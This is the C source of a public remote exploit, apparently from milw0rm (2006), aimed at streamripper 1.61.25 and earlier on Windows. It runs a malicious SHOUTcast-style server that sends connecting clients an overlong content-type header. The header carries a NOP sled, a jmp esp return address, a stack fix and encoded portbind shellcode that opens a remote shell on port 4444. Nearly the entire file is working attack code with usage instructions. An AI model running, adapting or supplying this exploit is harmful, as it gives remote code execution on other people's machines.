/*   
 * name:		streamripper  <= 1.61.25 win32 remote exploit
 * 
 * bug by:		Ulf Harnhammar
 * status:		public 
 * exploit:		psylocn
 * payload:		portbind 4444
 * **********************************************************
 * K:\>exploit.exe 80 0
 * [ public-release ]                                            
 *        streamripper  <= 1.61.25 remote exploit               
 *        exploit by psylocn 2006                               
 *        bug by Ulf Harnhammar                                 
 *                                                              
 * [+] server started!                                           
 * [+] server waits                                              
 *                   
 * 
 * go to next shell
 * K:\>streamripper.exe http://127.0.0.1:80
 * Connecting...
 * 
 * on other shell
 * [+] client conneted!                                          
 * [+] exploit send check shell on port 4444 
 *
 * now connect to 127.0.0.1:4444  
*/

/* #define _WIN32 */  
  
#include <stdio.h>  
#include <stdlib.h>  
#include <string.h>  
  
#ifdef _WIN32  
#include <winsock2.h>  
#pragma comment(lib, "ws2_32")  
#else  
#include <sys/types.h>  
#include <netinet/in.h>  
#include <sys/socket.h>  
#endif  

/* portbind shellcode port 4444*/  
unsigned char portbindsc[] =   
"\x29\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xaf"
"\xbf\xf8\x2a\x83\xeb\xfc\xe2\xf4\x53\xd5\x13\x67\x47\x46\x07\xd5"
"\x50\xdf\x73\x46\x8b\x9b\x73\x6f\x93\x34\x84\x2f\xd7\xbe\x17\xa1"
"\xe0\xa7\x73\x75\x8f\xbe\x13\x63\x24\x8b\x73\x2b\x41\x8e\x38\xb3"
"\x03\x3b\x38\x5e\xa8\x7e\x32\x27\xae\x7d\x13\xde\x94\xeb\xdc\x02"
"\xda\x5a\x73\x75\x8b\xbe\x13\x4c\x24\xb3\xb3\xa1\xf0\xa3\xf9\xc1"
"\xac\x93\x73\xa3\xc3\x9b\xe4\x4b\x6c\x8e\x23\x4e\x24\xfc\xc8\xa1"
"\xef\xb3\x73\x5a\xb3\x12\x73\x6a\xa7\xe1\x90\xa4\xe1\xb1\x14\x7a"
"\x50\x69\x9e\x79\xc9\xd7\xcb\x18\xc7\xc8\x8b\x18\xf0\xeb\x07\xfa"
"\xc7\x74\x15\xd6\x94\xef\x07\xfc\xf0\x36\x1d\x4c\x2e\x52\xf0\x28"
"\xfa\xd5\xfa\xd5\x7f\xd7\x21\x23\x5a\x12\xaf\xd5\x79\xec\xab\x79"
"\xfc\xec\xbb\x79\xec\xec\x07\xfa\xc9\xd7\xe9\x76\xc9\xec\x71\xcb"
"\x3a\xd7\x5c\x30\xdf\x78\xaf\xd5\x79\xd5\xe8\x7b\xfa\x40\x28\x42"
"\x0b\x12\xd6\xc3\xf8\x40\x2e\x79\xfa\x40\x28\x42\x4a\xf6\x7e\x63"
"\xf8\x40\x2e\x7a\xfb\xeb\xad\xd5\x7f\x2c\x90\xcd\xd6\x79\x81\x7d"
"\x50\x69\xad\xd5\x7f\xd9\x92\x4e\xc9\xd7\x9b\x47\x26\x5a\x92\x7a"
"\xf6\x96\x34\xa3\x48\xd5\xbc\xa3\x4d\x8e\x38\xd9\x05\x41\xba\x07"
"\x51\xfd\xd4\xb9\x22\xc5\xc0\x81\x04\x14\x90\x58\x51\x0c\xee\xd5"
"\xda\xfb\x07\xfc\xf4\xe8\xaa\x7b\xfe\xee\x92\x2b\xfe\xee\xad\x7b"
"\x50\x6f\x90\x87\x76\xba\x36\x79\x50\x69\x92\xd5\x50\x88\x07\xfa"
"\x24\xe8\x04\xa9\x6b\xdb\x07\xfc\xfd\x40\x28\x42\x5f\x35\xfc\x75"
"\xfc\x40\x2e\xd5\x7f\xbf\xf8\x2a\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc";  
 
char part1[] = "ICY 200 OK\r\nicy-notice1:aaaaa\r\n"
                   "icy-notice2:SHOUTcast Distributed Network Audio Server/FreeBSD v1.9.7<BR>\r\n"
                   "icy-name:Radioseven - www.radio.de\r\n"
                   "icy-genre:Dance Trance House\r\n"
                   "icy-url:http://www.radio.de\r\n"
                   "content-type:";                 //buffer to exploit
                   
char part2[] = "\r\n"
                   "icy-pub:1\r\n"
                   "icy-metaint:8192\r\n"
                   "icy-br:CCCCCCC\r\n\r\n";
                   
char fixstack[] = "\x81\xc4\xff\xef\xff\xff\x44"; //sub esp, 4097 + inc esp

struct targets {  
	int	num;  
	char	name[50];  
	long	jmpaddr;  
}  
target[]= {  
    { 0, "WinXP [sp2 ger] ", 0x7c951eed }, //jmp esp 
    { 1, "debug [testing] ", 0x41414141 },
};  

void Usage(){
	
	int i;
	printf("Usage: exploit.exe port target\n\n"				
			   "Targets:\n\n");
	for (i = 0; i < 2; i++)
	{
		if(target[i].name != 0)
			fprintf(stderr," [%u] %s\n",i,target[i].name);
		else
			break;
	}
	exit(1);
}  

int  main (int argc, char **argv)  {  
  
	char *host;  
	struct sockaddr_in my_addr;
    struct sockaddr_in their_addr;
    int sockfd,port,new_sock,sin_size=sizeof (their_addr);  
	   

	char buffer[3565];	 
  
#ifdef _WIN32  
	WSADATA wsa;  
#endif  
  

#ifdef _WIN32  
	 WSAStartup(MAKEWORD(2,0), &wsa);  
#endif  
  
	printf("[ public-release ]\n");
	printf("\tstreamripper  <= 1.61.25 remote exploit \n");  
	printf("\texploit by psylocn 2006\n");  
	printf("\tbug by Ulf Harnhammar\n\n"); 
	
	unsigned long ntarget = 0;
	if (argc < 3) Usage(); 
    if ((ntarget = atoi(argv[2])) > 1) Usage(); 
 
    port = (unsigned short)atoi(argv[1]);

	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {  
		printf("[-] socket error\n");  
		return 0;  
	}
	
    my_addr.sin_family = AF_INET;         
    my_addr.sin_port = htons(port);
    my_addr.sin_addr.s_addr = INADDR_ANY;   
	
	if (bind (sockfd, (struct my_addr *) &my_addr, sizeof (my_addr)) == SOCKET_ERROR) {  
		printf("\n[-] bind error\n");  
		return 0;  
	}
    else printf ("[+] server started!\n");
    
    if (listen (sockfd, 3) == SOCKET_ERROR)  {  
		printf("\n[-] listen error\n");  
		return 0;  
	}
	printf ("[+] server waits\n");
	
	if ((new_sock = accept(sockfd, (struct sockaddr *)&their_addr,&sin_size))  == INVALID_SOCKET)  {  
		printf("\n[-] accept error\n");  
		return 0;  
	}
 	else
 	printf ("[+] client conneted!\n");
   
    memset ( buffer, 0x90, sizeof(buffer) - 1 );
    memcpy ( buffer, part1, strlen(part1) );
    memcpy ( buffer+3146, &target[ntarget].jmpaddr, 4);
    memcpy ( buffer+3150, fixstack,strlen(fixstack) );
    memcpy ( buffer+3150+strlen(fixstack),portbindsc, strlen(portbindsc));
    
    memcpy ( buffer+3515, part2, sizeof(part2) );
	
	if (send(new_sock, buffer,sizeof(buffer)-1, 0) < 0) {  
		printf("[-] send error\n");  
		return 0;  
	}
	sleep(2000);
    printf("[+] exploit send check shell on port 4444\n");  

	closesocket(sockfd);  
#ifdef _WIN32 
  WSACleanup ();
#endif   
return 0;  
} 

// milw0rm.com [2006-08-29]
